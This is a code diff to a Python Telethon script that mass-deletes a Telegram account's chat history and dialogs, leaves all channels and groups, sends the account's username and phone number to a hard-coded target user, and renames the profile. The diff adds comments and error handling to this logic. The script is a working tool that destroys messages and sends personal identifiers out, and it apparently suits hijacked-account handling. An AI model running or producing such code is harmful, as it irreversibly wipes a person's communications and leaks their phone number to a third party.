@@ -19,13 +19,14 @@ client = TelegramClient("my_account", API_ID, API_HASH)
 async def main():
     await client.start()
 
-    async for dialog in client.iter_dialogs():
+    async for d in client.iter_dialogs():
         try:
-            entity = dialog.entity
-            name = dialog.name or str(dialog.id)
+            entity = d.entity
+            name = d.name or str(d.id)
 
             print(f"Processing: {name} ({type(entity).__name__})")
 
+            # Delete chat history
             await client(
                 DeleteHistoryRequest(
                     peer=entity,
@@ -34,14 +35,24 @@ async def main():
                 )
             )
 
+            # Channels / Supergroups
             if isinstance(entity, Channel):
-                await client(LeaveChannelRequest(entity))
-                print(f"Left Channel/Supergroup: {name}")
+                try:
+                    await client(LeaveChannelRequest(entity))
+                    await client.delete_dialog(entity)
+                    print(f"Left and deleted Channel/Supergroup: {name}")
+                except Exception as e:
+                    print(
+                        f"Could not leave channel {name}: "
+                        f"{type(e).__name__}: {e}"
+                    )
 
+            # Normal groups
             elif isinstance(entity, Chat):
                 await client.delete_dialog(entity)
                 print(f"Left Group: {name}")
 
+            # Private chats
             elif isinstance(entity, User):
                 await client.delete_dialog(entity)
                 print(f"Deleted Private Chat: {name}")
@@ -54,12 +65,13 @@ async def main():
 
         except Exception as e:
             print(
-                f"FAILED to process {dialog.name or dialog.id}. "
+                f"FAILED to process {d.name or d.id}. "
                 f"Reason: {type(e).__name__}: {e}"
             )
 
     print("\nDone deleting chats.")
 
+    # Get account information
     me = await client.get_me()
 
     username = f"@{me.username}" if me.username else "(no username)"
@@ -71,10 +83,11 @@ async def main():
         f"Phone: {phone}"
     )
 
-    print("\n--- Account info ---")
+    print("\n--- Account info to be sent ---")
     print(info_text)
-    print("--------------------")
+    print("--------------------------------")
 
+    # Send account information
     await client.send_message(
         TARGET_USERNAME,
         info_text
@@ -82,6 +95,7 @@ async def main():
 
     print(f"Sent account info to @{TARGET_USERNAME}")
 
+    # Change first name
     await client(
         UpdateProfileRequest(
             first_name=NEW_FIRST_NAME
